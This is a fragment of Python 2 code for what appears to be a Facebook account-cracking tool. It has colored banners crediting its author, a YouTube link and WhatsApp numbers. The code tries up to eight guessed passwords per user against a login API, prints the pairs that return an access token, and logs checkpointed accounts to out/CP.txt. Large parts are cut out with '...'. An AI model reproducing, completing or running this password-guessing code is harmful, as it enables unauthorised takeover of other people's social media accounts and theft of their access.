...
\33[38;1mLoaded....100%
\033[0;35m[\033[0;92m •• \033[0;35m] Author   : SARDAR ZAIN
...
\33[31;1m░A░Z░L░A░N░X░ Z░A░I░N░X░K░A░S░H░I░F░
...
\33[31;1mC͎H͎A͎N͎N͎E͎L͎ ͎LINK=͎ ͎https://youtube.com/channel/UC5pi-CkHn5WRVNoV8pY5xYA
\33[31;1mWHATSAPP: +92479500401/03035196755
\33[31;1mLOADING........
\033[0;39m[\033[0;92m •• \033[0;39m] Author   : SARDAR ZAIN
\033[1;39m\033[1;41;39mヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹ1 \033[0m
\033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~"""
print("\033[0;92mUsername/Password: ZAINXKASHIF")
print("\033[0;39m~~~~~~~~~~~~~~~~~~~~~~~~~~~")
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\033[0;92mKASHIF-[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[0;36;39ZAIN-[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
					...
					q = json.load(data)
					if 'access_token' in q:
						print '\033[0;91mKASHIF-[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[0;36;39ZAIN-[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
							cek = open("out/CP.txt", "a")
							...
							q = json.load(data)
							if 'access_token' in q:
								print '\033[0;92mKASHIF-[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[0;91;39ZAIN-[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
									cek = open("out/CP.txt", "a")
									...
									q = json.load(data)
									if 'access_token' in q:
										print '\033[0;92mKASHIF-[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[0;91;39ZAIN-[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
											cek = open("out/CP.txt", "a")
											...
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92mKASHIF-[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[0;91;39ZAIN-[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
													cek = open("out/CP.txt", "a")
													...
													q = json.load(data)
													if 'access_token' in q:
														print '\033[0;92mKASHIF-[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[0;91;39ZAIN-[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
															cek = open("out/CP.txt", "a")
															...
															q = json.load(data)
															if 'access_token' in q:
																print '\033[0;92mKASHIF-[OK] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[0;91;39ZAIN-[CP] \033[0;39m ' + user  + ' \x1b[0;36;39|\033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																	cek = open("out/CP.txt", "a")
																	...
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\033[0;92mKASHIF-[OK] \033[0;39m '+ user + ' \x1b[0;36;39|\033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[0;91;39ZAIN-[CP] \033[0;39m ' + user + '\x1b[0;36;39|\033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']
																			cek = open("out/CP.txt", "a")
																			cek.close()
